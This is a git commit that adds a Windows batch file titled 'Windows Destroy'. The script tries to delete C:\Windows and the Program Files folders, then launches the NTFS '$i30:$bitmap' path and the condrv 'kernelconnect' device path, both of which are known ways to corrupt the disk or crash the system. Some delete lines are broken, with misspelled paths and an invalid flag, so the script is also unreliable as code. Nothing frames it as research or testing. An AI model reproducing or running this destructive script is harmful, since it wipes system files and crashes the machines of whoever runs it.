bb6b9185685c682c2063357cec3419e5385fdf0c
Nguyễn Huy Hiếu <83147867+kirigizakazutovn@users.noreply.github.com>
2022-06-24 09:09:27 +0700

    Create index.bat

---
+++ index.bat
@@ -0,0 +1,7 @@
+@ECHO OFF
+TITLE Windows Destroy
+DEL C:\Windows /y
+DEL C:\Progam Files /y
+DEL C:\Progam Files (x86) /y
+START C:\:$i30:$bitmap 
+START \\\\.\\globalroot\\device\\condrv\\kernelconnect 
